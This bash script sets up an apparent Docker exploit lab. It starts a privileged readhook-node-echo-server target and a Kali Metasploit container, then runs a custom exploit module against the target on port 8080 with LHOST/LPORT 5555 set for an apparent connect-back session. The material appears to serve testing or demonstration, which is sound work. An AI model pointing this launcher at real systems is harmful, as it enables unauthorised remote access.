#!/bin/bash

declare -r loc=kali-metasploit
declare -r rem=readhook-node-echo-server
#declare -r sha=d5f0a0fc27530088efea7cc002e826d7195b1cd4 # readhook-node-echo-server from master branch
declare -r sha=974e68dc9af38dda90edb43d0e438ad2ad97d417 # readhook-node-echo-server from jitrop branch

# Get rid of any hangers-on
docker rm -f $loc $rem 2>/dev/null

# Start the remote target and get its IP address
docker run --privileged -dt --rm --name $rem polyverse/$rem:$sha
RHOST=$(docker exec -it $rem tail -n1 /etc/hosts | awk '{print $1}')

# Get the IP address of the attacker (that we will hopefully get again)
LHOST=$(docker run -it polyverse/$loc tail -n1 /etc/hosts | awk '{print $1}')

# Start metasploit and hope we get the same IP address.
docker run -it --rm --name $loc -v $PWD/exploits:/usr/share/metasploit-framework/modules/exploits/custom polyverse/$loc msfconsole -x "use exploit/custom/readhook_node_echo_server.rb; set INTERACTIVE true; set RHOST $RHOST; set RPORT 8080; set LHOST $LHOST; set LPORT 5555"
